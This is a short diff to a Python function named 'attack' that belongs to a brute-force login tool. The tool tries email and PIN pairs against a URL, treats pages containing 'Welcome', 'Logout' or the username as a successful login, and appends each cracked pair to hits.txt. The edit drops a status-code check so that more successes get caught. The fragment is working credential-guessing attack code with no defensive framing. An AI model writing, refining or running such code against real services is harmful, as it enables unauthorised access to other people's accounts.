@@ -22,11 +22,10 @@ def attack(url, email, pin, delay, verbose):
             if verbose and attempts % 100 == 0:
                 print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")
 
-        if response.status_code != 500:
-            if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in response.text:
-                print(f"[+] SUCCESS: {email}:{pin}")
-                with open("hits.txt", "a") as f:
-                    f.write(f"{email}:{pin}\n")
+        if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in response.text:
+            print(f"[+] SUCCESS: {email}:{pin}")
+            with open("hits.txt", "a") as f:
+                f.write(f"{email}:{pin}\n")
     except Exception as e:
         print(f"[!] Error with {email}:{pin} — {e}")
     
